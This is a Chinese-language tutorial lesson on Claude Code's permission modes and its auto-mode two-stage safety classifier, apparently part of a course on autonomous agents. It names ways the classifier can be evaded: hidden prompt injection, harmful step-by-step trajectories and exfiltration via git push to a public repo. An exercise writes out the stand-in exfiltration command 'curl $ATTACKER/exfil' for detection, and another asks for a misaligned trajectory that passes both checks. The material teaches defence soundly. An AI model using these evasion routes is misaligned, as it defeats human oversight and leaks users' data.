# 10 · 将 Claude Code 作为自主智能体：权限模式与自动模式

> Claude Code 暴露了七种权限模式（permission mode）。`plan` 在每个动作前都会征求许可，`default` 仅对高风险动作征求许可，`acceptEdits` 自动批准文件写入但仍会确认 shell 执行，`bypassPermissions` 则批准一切。自动模式（Auto Mode，2026 年 3 月 24 日发布）用一个两阶段并行的安全分类器取代了逐动作审批：在每个动作上运行一次单 token 的快速检查；被标记的动作则触发一次思维链（chain-of-thought）深度复审。动作预算通过 `max_turns` 与 `max_budget_usd` 强制执行。自动模式以研究预览（research preview）形式发布——Anthropic 已明确声明该分类器单独不足以保障安全。

**类型：** 学习
**语言：** Python（标准库，两阶段分类器模拟器）
**前置：** 阶段 15 · 01（长程智能体）、阶段 15 · 09（编码智能体全景）
**时长：** 约 45 分钟

## 问题所在

一个运行在你机器上的自主编码智能体属于一个独立的安全类别。其攻击面（attack surface）是该智能体所能触及的一切——文件系统、网络、凭据、剪贴板、任意浏览器标签页、任意已打开的终端。Bruce Schneier 等人已公开提出警示：计算机操作类智能体（computer-use agent）不是聊天机器人的「功能更新」，它们是一种新型工具，带有一种新型的风险画像。

Claude Code 的权限系统就是 Anthropic 给出的答案。它不是一个「自主／非自主」的二元开关，而是一条覆盖能力梯度（capability ladder）的七种模式：plan → default → acceptEdits → … → bypassPermissions。每种模式都是速度与逐动作审查之间的一种不同权衡。自动模式（2026 年 3 月）增加了一个两阶段分类器，对于分类器判定为安全的动作，将审批从用户的关键路径上移除；同时对分类器标记的动作保留一层审查。

工程上的问题是：这套系统能拦住什么、漏掉什么，以及某个具体任务实际上应该用哪种模式？

## 核心概念

### 七种权限模式

| 模式 | 行为 | 何时使用 |
|---|---|---|
| `plan` | 智能体提出一份计划；用户批准整份计划；每个动作在执行前都会被审查 | 不熟悉的任务；与生产环境相邻的代码；首次在某个仓库上使用该智能体 |
| `default` | 智能体运行各动作；对任何「高风险」动作（shell 执行、破坏性操作、网络调用）提示用户 | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行与网络调用仍会提示 | 跨多个文件的重构遍历 |
| `acceptExec` | shell 命令在一个经过筛选的白名单（allowlist）内自动批准；写入自动批准 | 每条 shell 命令都是 `npm test` 之类的紧凑内层循环 |
| `autoMode` | 两阶段安全分类器；被标记的动作升级为审查 | 在受约束工作区内进行的无人值守长程运行 |
| `yolo` | 跳过大多数提示；仍执行工具白名单／黑名单（denylist） | 临时沙箱、CI 任务、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档中记载为「仅限你愿意丢弃的临时容器内部」 |

（上表名称与公开的 Claude Code 文档一致；「yolo」是对这一宽松中间档位的非正式简称。）

### 一页讲清自动模式

自动模式（于 2026 年 3 月 24 日上线）是第一种将逐动作审批委派给模型的权限模式。其结构如下：

1. **阶段 1——单 token 分类器。** 在每个被提议的动作上运行。开销低。返回「safe」或「flag」。设计上与主智能体循环并行运行，因此已批准的动作不会停留在队列中等待。
2. **阶段 2——次级策略／安全复审。** 仅在被标记的动作上运行。针对该动作、会话的当前状态以及声明的任务，执行一次聚焦的策略与安全评估。若置信度较低，则升级到用户的人在回路（HITL）。

预算控制与分类器并行存在：

- `max_turns`——一个会话内的总迭代次数。
- `max_budget_usd`——触发即中止会话的美元上限。
- 每工具的动作次数限制（例如 `WebFetch` 调用不超过 N 次，等等）。

### 该系统能拦住什么

- 直接注入到工具输入中的提示注入（prompt injection），且被注入的指令映射到某种已知的高风险动作形态。
- 重复性的工具循环——分类器能看到动作 N+1 与动作 N 几乎完全相同，且连续出现五次。
- 在一个本应仅做文件编辑的会话中明显越界的 shell 命令。

### 该系统可能漏掉什么

- **隐晦的提示注入**，它在不产生任何单个被标记动作的情况下调节行为。间接提示注入并非一个可被完全修补的漏洞（OpenAI preparedness 负责人，2025 年，论及浏览器智能体——见第 11 课）。
- **语义层面的不当行为。** 每个单独动作看起来都安全，而组合而成的轨迹却是有害的。分类器评判的是动作；它并不重新推导用户的意图。
- **通过合法通道的数据外泄。** 把数据写入一个你拥有的文件，然后 `git push` 到一个公共仓库，是一串被允许的动作，其组合才是问题所在。

### 研究预览的定位

Anthropic 将自动模式作为研究预览发布。文档明确指出该分类器是一层防护，而非解决方案：用户应将自动模式与预算、白名单、隔离工作区以及轨迹审计（第 12–16 课）结合使用。研究预览的定位也反映了已被记录的「评估与部署之间的差距」（第 1 课）——一个通过离线评估的分类器，在用户上下文模糊的真实会话中可能表现不同。

### 这条能力梯度在你的工作流中的位置

- 不熟悉的任务：从 `plan` 起步。阅读计划比回滚一次糟糕的运行更省成本。
- 已知的重构：`acceptEdits` 能省下大量确认点击。
- 无人值守的后台运行：仅在一个你已度量过其爆炸半径（blast radius）的工作区内使用 `autoMode`（无凭据、无生产环境挂载、无你未主动选择开启的出站流量）。
- 临时容器：`yolo` / `bypassPermissions` 当且仅当该容器及其凭据可丢弃时才可接受。

## 动手实践

`code/main.py` 模拟了这个两阶段分类器。阶段 1 是对被提议动作的一条廉价关键词规则；阶段 2 是一个较慢的多规则复审器。驱动程序输入一段简短的合成轨迹（安全动作、一次提示注入尝试、一个重复循环），并展示分类器在何处拦住、在何处漏掉。

## 交付实现

`outputs/skill-permission-mode-picker.md` 将任务描述匹配到合适的权限模式、预算上限以及所需的隔离级别。

## 练习

1. 运行 `code/main.py`。哪种合成动作类型从不会被阶段 1 标记、却总是被阶段 2 拦住？哪种两者都拦不住？

2. 扩展阶段 1 的规则集，使其能拦住某个特定的已知恶意形态（例如 `curl $ATTACKER/exfil`）。在良性动作样本上测量其误报率（false-positive rate）。

3. 阅读 Anthropic 的「How the agent loop works」文档。列出智能体在 `default` 模式下默认触及的每一项外部状态。其中哪些是你在无人值守运行 `autoMode` 之前需要单独设防的？

4. 设计一个 24 小时无人值守运行的预算：`max_turns`、`max_budget_usd`、每工具上限、白名单。为每个数字给出理由。

5. 描述一条轨迹：其中每个单独动作都被阶段 1 与阶段 2 批准，但组合行为却是不对齐（misaligned）的。（第 14 课讲解了终止开关（kill switch）与金丝雀令牌（canary token）如何应对这一问题。）

## 关键术语

| 术语 | 人们怎么说 | 它实际指什么 |
|---|---|---|
| 权限模式（Permission mode） | 「智能体能做多少事」 | 七种具名策略之一，用于控制逐动作审批 |
| plan 模式 | 「做任何事之前都先问」 | 智能体写出一份计划；用户在执行前批准 |
| acceptEdits | 「让它写文件」 | 文件写入自动批准；shell 执行仍会提示 |
| autoMode | 「自动审批」 | 两阶段安全分类器；被标记的动作升级 |
| bypassPermissions | 「完全 YOLO」 | 批准一切；面向临时容器 |
| 阶段 1 分类器 | 「快速 token 检查」 | 对被提议动作的单 token 规则；并行运行 |
| 阶段 2 分类器 | 「深度复审」 | 对被标记动作的思维链推理 |
| 研究预览（Research preview） | 「非正式发布（GA）」 | Anthropic 用于标记那些失效模式仍在梳理中的功能的说法 |
